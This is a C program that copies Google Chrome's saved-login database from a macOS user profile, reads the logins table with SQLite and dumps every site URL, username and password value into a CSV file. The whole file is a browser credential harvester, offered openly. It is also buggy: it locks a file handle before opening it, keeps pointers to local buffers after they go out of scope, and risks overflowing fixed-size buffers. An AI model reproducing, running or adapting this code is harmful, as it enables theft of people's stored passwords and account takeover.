#include<stdio.h>
#include<string.h>
#include <sqlite3.h>
#include <stdlib.h>
#include <sys/file.h>
#include <unistd.h>

int initial_csv = 0;

struct user_info {
    char * url;
    char * username;
    char * password;
};

// Adding line to the CSV File
static void save_data(struct user_info *parent_)
{
    char *filename = "Chrome_data.csv";

    FILE *fp;

    // Lock file
    flock(fp, LOCK_SH);

    // Opening File Mode : Initial or Append
    if(initial_csv == 0)
    {
        printf("\nCreating %s file",filename);

        fp=fopen(filename,"w+");
        fprintf(fp,"Url; User; Password;");

        initial_csv = 1;
    } else
    {
        fp=fopen(filename,"a");
    }

    printf("\nAdding data...");
    // Adding line information
    fprintf(fp,"\n%s;%s;%s ",parent_->url, parent_->username, parent_->password);

    fclose(fp);
    // Release locked file
    flock(fp, LOCK_UN);
}


static int callback(void * data, int argc, char **argv, char **azColName)
{
    int i;

    struct user_info * parent_ = (struct user_info *)data;

    for(i = 0; i < argc; i++)
    {
        if(strcmp(azColName[i], "password_value") == 0)
        {
            // Adding Quote to the text
            char passwordFormat[256];
            sprintf(passwordFormat, "\"%s\"", argv[i]);
            parent_->password = strcmp(argv[i], "") ? passwordFormat : "NULL";
        }
        else if(strcmp(azColName[i], "origin_url") == 0)
        {
            char urlFormat[256];
            sprintf(urlFormat, "\"%s\"", argv[i]);
            parent_->url = strcmp(argv[i], "") ? urlFormat : "NULL";
        }
        else if(strcmp(azColName[i], "username_value") == 0)
        {
            char usernameFormat[256];
            sprintf(usernameFormat, "\"%s\"", argv[i]);
            parent_->username = strcmp(argv[i], "") ? usernameFormat : "NULL";
        }
    }

    // Adding only valid Username & Password
    if((strcmp(parent_->username, "NULL")) && (strcmp(parent_->password, "NULL")))
    {
        save_data(parent_);
    }

    return 0;
}

int main()
{

    sqlite3 * db;

    char * zErrMsg = 0;

    int rc;

    char * sql;

    struct user_info * userData_;
    userData_ = (struct user_info*) malloc(sizeof(struct user_info));

    // Copy file Logindata
    printf("Search databases...\n");
    system("cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data ./login_chrome");

    rc = sqlite3_open_v2("./login_chrome", &db, SQLITE_OPEN_READONLY, NULL);

    if( rc != SQLITE_OK) {
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
        return EXIT_FAILURE;
    }

    printf("Loading data...\n");
    // Create SQL statement
    sql = "SELECT * FROM 'logins'";

    // Execute SQL statement
    rc = sqlite3_exec(db, sql, callback, (void*)userData_, &zErrMsg);

    if( rc != SQLITE_OK ) {
        fprintf(stderr, "SQL error: %s\n", zErrMsg);
        sqlite3_free(zErrMsg);
    }

    sqlite3_close(db);

    return 0;
}